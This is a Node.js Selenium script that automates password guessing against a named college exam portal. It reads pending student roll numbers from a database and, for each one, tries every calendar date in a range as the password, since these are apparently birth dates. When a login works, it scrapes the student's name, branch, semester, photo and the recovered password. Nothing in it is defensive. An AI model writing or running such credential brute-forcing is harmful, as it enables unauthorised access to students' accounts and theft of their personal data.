const { Builder, By } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const moment = require('moment');
const prisma = require("./prismaClient");


async function tryPasswords(roll_number , start , end) {
    console.log(`Processing User ID: ${roll_number}`);
        
    const startDate = moment(start, 'YYYY-MM-DD');
    const endDate = moment(end, 'YYYY-MM-DD');

    let date = startDate.clone();
    const options = new chrome.Options();
    //options.addArguments('--headless', '--disable-gpu', '--no-sandbox');
    options.addArguments( '--disable-gpu', '--no-sandbox');

    const driver = await new Builder().forBrowser('chrome').setChromeOptions(options).build();

    try {
        await driver.get('https://mgitexams.in');
        await driver.sleep(3000);
        await driver.findElement(By.id('lnkLogins')).click();
        await driver.sleep(3000);
        await driver.findElement(By.id('lnkStudent')).click();
        await driver.sleep(3000);

        while (date.isSameOrBefore(endDate)) {
            const formattedDate = date.format('DD/MM/YYYY');
            console.log(`Trying password: ${formattedDate} for User ID: ${roll_number}`);

            await driver.findElement(By.id('txtUserId')).clear();
            await driver.findElement(By.id('txtUserId')).sendKeys(roll_number);
            await driver.findElement(By.id('txtPwd')).clear();
            await driver.findElement(By.id('txtPwd')).sendKeys(formattedDate);
            await driver.findElement(By.id('btnLogin')).click();
            await driver.sleep(2000);

            const warningElements = await driver.findElements(By.id('lblWarning'));
            if (warningElements.length > 0) {
                const text = await warningElements[0].getText();
                if (text === 'Password is Incorrect') {
                    date.add(1, 'days');
                    continue;
                }
            }

            // If login is successful
            const imgSrc = await driver.findElement(By.id('ImgStudent')).getAttribute('src');
            const rollNumber = await driver.findElement(By.id('lblHTNo')).getText();
            const name = await driver.findElement(By.id('lblStudName')).getText();
            const branch = await driver.findElement(By.id('lblBranch')).getText();
            const sem = await driver.findElement(By.id('lblSem')).getText();

            console.log(`Password found: ${formattedDate} for User ID: ${roll_number}`);
            return [rollNumber, name, branch, sem, imgSrc, formattedDate];
        }

        console.log(`Password not found for User ID: ${roll_number}`);
        return [roll_number, null, null, null, null, null];
    } catch (error) {
        console.error(`Error processing User ID ${roll_number}:`, error);
        return [roll_number, null, null, null, null, null];
    } finally {
        await driver.quit();
    }
}

function generateYearList(prefix) {
    let yearList = [];
    if(prefix === "17") {
        yearList = ["2000", "2001", "1999", "2002", "1998", "1997", "2003", "1996", "1995", "2004", "1994"]
    }
    else if(prefix === "18") {
        yearList = ["2001", "2002", "2000", "2003", "1999", "1998", "2004", "1997", "1996", "2005", "1995"]
    }
    else if(prefix === "19") {
        yearList = ["2002", "2003", "2001", "2004", "2000", "1999", "2005", "1998", "1997", "2006", "1996"]
    }
    else if(prefix === "20") {
        yearList = ["2003", "2004", "2002", "2005", "2001", "2000", "2006", "1999", "1998", "2007", "1997"]
    }
    else if(prefix === "21") {
        yearList = ["2004", "2005", "2003", "2006", "2002", "2001", "2007", "2000", "1999", "2008", "1998"]
    }
    else if(prefix === "22") {
        yearList = ["2005", "2006", "2004", "2007", "2003", "2002", "2008", "2001", "2000", "2009", "1999"]
    }
    else if(prefix === "23") {
        yearList = ["2006", "2007", "2005", "2008", "2004", "2003", "2009", "2002", "2001", "2010", "2000"]
    }
    else if(prefix === "24") {
        yearList = ["2007", "2008", "2006", "2009", "2005", "2004", "2010", "2003", "2002", "2011", "2001"]
    }
    return yearList;
}


async function tryRollNumbers() {

    const students = await prisma.student.findMany({
        where: {
          status: "pending",
        },
        orderBy: {
          createdAt: "asc",
        },
        take: 5, 
    });

    const rollNumbers = students.map(student => student.roll_number);
      
    console.log(rollNumbers);
      
    for (let rollNumber of rollNumbers) {

        let prefix = rollNumber.substring(0, 2);
        const yearList = generateYearList(prefix);
        tryPasswords(rollNumber,"2020/01/01","2021/12/31") 
       
    };

}

tryRollNumbers();
